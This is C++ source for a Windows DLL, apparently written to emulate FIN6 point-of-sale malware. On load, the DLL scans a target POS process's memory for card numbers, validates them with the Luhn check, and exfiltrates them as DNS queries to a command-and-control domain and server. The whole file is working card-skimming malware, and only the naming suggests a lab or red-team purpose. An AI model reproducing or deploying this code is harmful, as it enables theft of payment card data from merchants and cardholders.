#include <WinSock2.h>
#include <Windows.h>
#include <WinDNS.h>
#include <iostream>
#include <TlHelp32.h>
#include <string>
#include <regex>
#include "FIN6_emulation.h"

#pragma comment(lib, "Dnsapi.lib")  // Link the DNS API library
#pragma comment(lib, "Ws2_32.lib")	// Link the WINSOCK API library
using namespace std;

// Function to get the process ID
DWORD GetPID(const string& pName){
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    
    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
			string binPath = entry.szExeFile;
            if (binPath.find(pName) != string::npos) {
                CloseHandle(snapshot); 
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);  // Close snapshot handle
    return 0;  // Return 0 if process not found
}



bool luhnCheck(string cardNumber) {
    int sum = 0;
    bool isSecond = false;
    
    // Traverse the card number from right to left
    for (int i = cardNumber.length() - 1; i >= 0; --i) {
        int digit = cardNumber[i] - '0';  // Convert character to integer

        if (isSecond) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;  // Subtract 9 if digit is greater than 9
            }
        }

        sum += digit;
        isSecond = !isSecond;  // Toggle the flag
    }

    // If the total sum is divisible by 10, the card is valid
    return (sum % 10 == 0);
}
void sendToExfiltrate(string card_data){
	DNS_STATUS status;
    string domain_name = ".ns.zkamaz1902.com"; // here data will be send to my dns c2 card-data.ns.zkamaz1902.com  
	
    PDNS_RECORD pDnsRecord = nullptr;

	char* pOwnerName = strdup((card_data + domain_name).c_str());

    WORD wType = DNS_TYPE_A;

    // Create the server list
    PIP4_ARRAY pSrvList = (PIP4_ARRAY)malloc(sizeof(IP4_ARRAY));

    pSrvList->AddrCount = 1;
   
	pSrvList->AddrArray[0] = inet_addr("192.168.1.13");  // IP of C2 DNS server
    // Perform the DNS query
    status = DnsQuery_A(
        pOwnerName,          // The domain name to query (including card data)
        wType,               // Query for an A record
        DNS_QUERY_BYPASS_CACHE,  // Bypass local resolver cache
        pSrvList,            // Server list containing the C2 DNS server
        &pDnsRecord,         // Pointer to DNS_RECORD structure for results
        NULL                 // Reserved, set to NULL
    );

    // Free memory
    if (pDnsRecord) {
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
    }
    free(pSrvList);
}
DWORD WINAPI checkAndSend(LPVOID lpParam) {
    
    string* card = static_cast<string*>(lpParam);

   
    // Remove hyphens from card number
    string cardNumber = *card;
    cardNumber.erase(std::remove_if(cardNumber.begin(), cardNumber.end(), [](char c) {
        return c == '-';  
    }), cardNumber.end());

    // Validate card number using the Luhn algorithm
    if (luhnCheck(cardNumber)) {
        // If valid, send it to the exfiltration function
        sendToExfiltrate(*card);
    }

    delete card;  // Clean up the allocated memory
    return 0;
}

extern "C" __declspec(dllexport) int run(){
	// put your target app here
    DWORD PID = GetPID("simple_victim_pos");
    if (PID == 0) {
        return 1;
    }

    // Open the process with necessary access rights
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, PID);
    if (!hProcess) {
        return 1;
    }
    
    MEMORY_BASIC_INFORMATION mbi;
    char buf[1024];  // Buffer for reading memory
    SIZE_T dwBytes;
    void* lpAddress = nullptr;  // Start from address 0
    regex cardRegex("(\\d{4}[- ]?\\d{4}[- ]?\\d{4}[- ]?\\d{4})");  // Regex to match card numbers

    // Iterate over the process's virtual memory
    while (VirtualQueryEx(hProcess, lpAddress, &mbi, sizeof(mbi))) {
        // Check for committed memory that's either private or mapped
        if (mbi.State == MEM_COMMIT && (mbi.Type == MEM_PRIVATE || mbi.Type == MEM_MAPPED)) {
            SIZE_T regionSize = mbi.RegionSize;  // Size of the memory region
            SIZE_T offset = 0;
            
            // Read the memory region in chunks of 4096 bytes
            while (offset < regionSize) {
                SIZE_T bytesToRead = min(sizeof(buf), regionSize - offset);  // Ensure we don’t read past the region
                void* addressToRead = (BYTE*)mbi.BaseAddress + offset;

                memset(buf, 0, sizeof(buf));  // Clear buffer before reading memory
                
                if (ReadProcessMemory(hProcess, addressToRead, buf, bytesToRead, &dwBytes)) {
                    string bufferStr(buf, dwBytes);  // Convert to string for regex search
                    smatch match;
                    if (regex_search(bufferStr, match, cardRegex)) {
						string* cardCopy = new string( match.str() );
						CreateThread(0,0,(LPTHREAD_START_ROUTINE)checkAndSend,(LPVOID)cardCopy,0,0);
						
                    }
                }
                offset += bytesToRead;  // Move to the next chunk of memory
            }
        }
        // Move to the next memory region
        lpAddress = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
    }
    // Clean up
    CloseHandle(hProcess);
    return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
					 )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		run();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

